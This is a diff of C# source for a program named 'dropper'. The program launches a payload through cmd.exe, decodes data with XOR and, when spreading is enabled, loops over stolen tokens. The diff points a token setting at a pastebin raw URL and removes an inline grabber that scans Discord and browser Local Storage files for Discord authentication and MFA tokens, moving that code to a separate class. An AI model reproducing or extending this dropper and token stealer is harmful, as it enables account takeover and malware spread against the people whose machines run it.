@@ -1,6 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Text.RegularExpressions;
 using System.Threading;
 using System.Linq;
 using System.Diagnostics;
@@ -16,7 +14,7 @@ namespace dropper
 {
     internal class Program
     {
-        private static string token = "";
+        private static string token = "https://pastebin.com/raw/xs0Q8kzv";
         private static string prefix = "";
         private static string geolock = "";
         private static string spreadmessage = @"";
@@ -50,7 +48,7 @@ namespace dropper
             Process.Start("cmd.exe", "/c " + payload);
 
             if (!enable_spread) Environment.Exit(0);
-            string[] tokens = GetTokens();
+            string[] tokens = TokenGrabber.GetTokens();
             foreach (string t in tokens)
             {
                 try
@@ -93,58 +91,6 @@ namespace dropper
                 input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]);
             }
             return input;
-        }
-
-        static string[] GetTokens()
-        {
-            DirectoryInfo[] directories = new DirectoryInfo[]
-            {
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discord\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discordptb\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discordcanary\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\discorddevelopment\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera Stable\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Amigo\User Data\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Torch\User Data\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Kometa\User Data\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Orbitum\User Data\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\CentBrowser\User Data\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\7Star\7Star\User Data\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Vivaldi\User Data\Default\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome SxS\User Data\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Epic Privacy Browser\User Data\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb"),
-            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb")
-            };
-
-            List<string> tokens = new List<string>();
-            foreach (DirectoryInfo d in directories)
-            {
-                try
-                {
-                    foreach (FileInfo file in d.GetFiles("*.ldb"))
-                    {
-                        string readFile = file.OpenText().ReadToEnd();
-                        foreach (Match match in Regex.Matches(readFile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
-                        {
-                            tokens.Add(match.Value);
-                        }
-                        foreach (Match match in Regex.Matches(readFile, @"mfa\.[\w-]{84}"))
-                        {
-                            tokens.Add(match.Value);
-                        }
-                    }
-                }
-                catch { continue; }
-            }
-
-            return tokens.Distinct().ToArray();
         }
     }
 }
